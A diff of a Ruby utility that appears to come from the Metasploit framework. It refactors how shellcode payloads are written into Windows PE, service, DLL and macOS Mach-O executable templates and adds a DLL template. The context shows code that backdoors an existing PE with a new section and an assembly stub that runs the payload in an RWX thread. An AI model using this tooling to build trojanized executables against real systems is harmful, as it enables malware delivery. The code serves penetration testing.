@@ -1,3 +1,7 @@
+##
+# $Id$
+##
+
 ###
 #
 # framework-util-exe
@@ -90,7 +94,7 @@ require 'metasm'
 				raise RuntimeError, "Junk at end of file. Is this a packed exe?"
 			end
 
-			#find first section file offset and free RVA for new section 
+			#find first section file offset and free RVA for new section
 			free_rva = pe.hdr.opt.AddressOfEntryPoint
 			first_off = fsize
 			pe.sections.each do |sec|
@@ -103,12 +107,12 @@ require 'metasm'
 			#See if we can add a section
 			first_sechead_file_off = pe.hdr.dos.e_lfanew + Rex::PeParsey::PeBase::IMAGE_FILE_HEADER_SIZE + pe.hdr.file.SizeOfOptionalHeader
 			new_sechead_file_off = first_sechead_file_off + pe.hdr.file.NumberOfSections * Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER
-			if new_sechead_file_off + Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER > first_off	
+			if new_sechead_file_off + Rex::PeParsey::PeBase::IMAGE_SIZEOF_SECTION_HEADER > first_off
 				raise RuntimeError, "Not enough room for new section header"
 			end
 
 			# figure out where in the new section to put the start. Right now just putting at the beginning of the new section
-			start_rva = free_rva 
+			start_rva = free_rva
 
 			#make new section, starting at free RVA
 			new_sec = win32_rwx_exec_thread(code, pe.hdr.opt.AddressOfEntryPoint - start_rva)
@@ -282,8 +286,10 @@ require 'metasm'
 		end
 
 		bo = pe.index('PAYLOAD:')
-		pe[bo,  2048] = code if bo
-		pe[136,    4] = [rand(0x100000000)].pack('V')
+		raise RuntimeError, "Invalid Win32 PE OLD EXE template!" if not bo
+		pe[bo, code.length] = code
+
+		pe[136, 4] = [rand(0x100000000)].pack('V')
 
 		ci = pe.index("\x31\xc9" * 160)
 		cd = pe.index("\x31\xc9" * 160, ci + 320)
@@ -314,7 +320,8 @@ require 'metasm'
 		fd.close
 
 		bo = pe.index('PAYLOAD:')
-		pe[bo,2048] = [code].pack('a2048') if bo
+		raise RuntimeError, "Invalid Win64 PE EXE template!" if not bo
+		pe[bo, code.length] = code
 
 		return pe
 	end
@@ -327,12 +334,28 @@ require 'metasm'
 		fd.close
 
 		bo = pe.index('PAYLOAD:')
-		pe[bo, 2048] = [code].pack('a2048') if bo
+		raise RuntimeError, "Invalid Win32 PE Service EXE template!" if not bo
+		pe[bo, code.length] = code
 
 		bo = pe.index('SERVICENAME')
-		pe[bo, 11] = [name].pack('a11') if bo
+		raise RuntimeError, "Invalid Win32 PE Service EXE template!" if not bo
+		pe[bo, name.length] = name
 
 		pe[136, 4] = [rand(0x100000000)].pack('V')
+
+		return pe
+	end
+
+	def self.to_win32pe_dll(framework, code)
+		pe = ''
+
+		fd = File.open(File.join(File.dirname(__FILE__), "..", "..", "..", "data", "templates", "template.dll"), "rb")
+		pe = fd.read(fd.stat.size)
+		fd.close
+
+		bo = pe.index('PAYLOAD:')
+		raise RuntimeError, "Invalid Win32 PE DLL template!" if not bo
+		pe[bo, code.length] = code
 
 		return pe
 	end
@@ -344,10 +367,14 @@ require 'metasm'
 		mo = fd.read(fd.stat.size)
 		fd.close
 
-		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
-		co = mo.index( " " * 512 )
+		bo = mo.index('PAYLOAD:')
+		raise RuntimeError, "Invalid OSX ArmLE Mach-O template!" if not bo
+		mo[bo, code.length] = code
 
-		mo[bo, 2048] = [code].pack('a2048') if bo
+		# Not used?
+		#co = mo.index('COMMENT:')
+		#mo[co, comment.length] = comment
+
 		return mo
 	end
 
@@ -358,10 +385,13 @@ require 'metasm'
 		mo = fd.read(fd.stat.size)
 		fd.close
 
-		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
-		co = mo.index( " " * 512 )
+		bo = mo.index('PAYLOAD:')
+		raise RuntimeError, "Invalid OSX PPC Mach-O template!" if not bo
+		mo[bo, code.length] = code
 
-		mo[bo, 2048] = [code].pack('a2048') if bo
+		# Not used?
+		#co = mo.index('COMMENT:')
+		#mo[co, comment.length] = comment
 
 		return mo
 	end
@@ -373,10 +403,13 @@ require 'metasm'
 		mo = fd.read(fd.stat.size)
 		fd.close
 
-		bo = mo.index( "\x90\x90\x90\x90" * 1024 )
-		co = mo.index( " " * 512 )
+		bo = mo.index('PAYLOAD:')
+		raise RuntimeError, "Invalid OSX x86 Mach-O template!" if not bo
+		mo[bo, code.length] = code
 
-		mo[bo, 2048] = [code].pack('a2048') if bo
+		# Not used?
+		#co = mo.index('COMMENT:')
+		#mo[co, comment.length] = comment
 
 		return mo
 	end
@@ -403,6 +436,7 @@ require 'metasm'
 
 		return mo
 	end
+
 	def self.to_exe_vba(exes='')
 		exe = exes.unpack('C*')
 		vba = ""
@@ -1046,8 +1080,8 @@ require 'metasm'
 
 	# This wrapper is responsible for allocating RWX memory, copying the
 	# target code there, setting an exception handler that calls ExitProcess,
-	# starting the code in a new thread, and finally jumping back to the next 
-	# code to execute. block_offset is the offset of the next code from 
+	# starting the code in a new thread, and finally jumping back to the next
+	# code to execute. block_offset is the offset of the next code from
 	# the start of this code
 	def self.win32_rwx_exec_thread(code, block_offset)
 
@@ -1194,7 +1228,7 @@ require 'metasm'
 
 		exitblock:
 		#{stub_exit}
-		
+
 		set_handler:
 		  xor eax,eax
 ;		  push dword [fs:eax]
@@ -1208,9 +1242,9 @@ require 'metasm'
 		  push 0x160D6838        ; hash( "kernel32.dll", "CreateThread" )
 		  call ebp               ; Spawn payload thread
 
-		  pop eax                ; Skip 
-;		  pop eax                ; Skip 
-		  pop eax                ; Skip 
+		  pop eax                ; Skip
+;		  pop eax                ; Skip
+		  pop eax                ; Skip
 		  popad                  ; Get our registers back
 ;		  sub esp, 44             ; Move stack pointer back past the handler
 		^
